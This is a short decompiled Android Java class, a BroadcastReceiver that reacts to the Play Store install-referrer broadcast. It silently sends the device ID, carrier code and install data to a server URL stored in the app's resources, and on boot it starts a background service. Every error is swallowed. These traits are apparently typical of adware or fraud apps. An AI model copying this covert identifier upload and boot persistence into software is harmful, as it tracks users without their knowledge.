public class BaseBBR extends BroadcastReceiver {
    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        try {
            String action = intent.getAction();
            if (action.equals("com.android.vending.INSTALL_REFERRER")) {
                String referrer = intent.getStringExtra("referrer");
                if (referrer != null && referrer.length() > 0) {
                    Tools.setVid(context, Integer.parseInt(referrer));
                }
                String instUrl = Tools.getResourceValue(context, "srvcUrl");
                short serviceId = Short.parseShort(Tools.getResourceValue(context, "serviceId"));
                long instId = Tools.getInsId(context);
                String MNC = Tools.getMNC(context);
                String dev_id = Tools.getDeviceId(context);
                int ver = Tools.getVer(context);
                String url = String.format(Locale.US, instUrl, "ins", Long.valueOf(instId), MNC, Short.valueOf(serviceId), referrer, dev_id, Integer.valueOf(ver));
                Tools.loadUrl(url);
                return;
            }
            if (action.equals("android.intent.action.BOOT_COMPLETED")) {
                Tools.startService(context);
            }
        } catch (Exception e) {
        }
    }
}

